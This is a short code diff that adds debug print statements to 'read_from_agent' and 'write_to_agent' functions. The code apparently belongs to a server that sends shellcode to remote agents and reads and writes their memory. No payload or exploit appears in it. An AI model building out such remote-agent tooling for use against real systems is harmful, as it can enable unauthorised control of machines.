@@ -23,6 +23,7 @@ def send_and_wait(agent_id, shellcode):
     return response_data
 
 def read_from_agent(agent_id, memory, size):
+    print(f"About to read from agent {agent_id} {hex(memory)} {size}")
     from routes.anon.agent import handle_msg_type, requests as agent_requests
     from routes.anon.agent import ATTEMPTS
     global responses
@@ -47,6 +48,7 @@ def read_scratchpad(agent_id, size):
 
 
 def write_to_agent(agent_id, memory, data):
+    print(f"About to write to agent {agent_id} {hex(memory)} {len(data)}")
     from routes.anon.agent import handle_msg_type, requests as agent_requests
     from routes.anon.agent import ATTEMPTS
     global responses
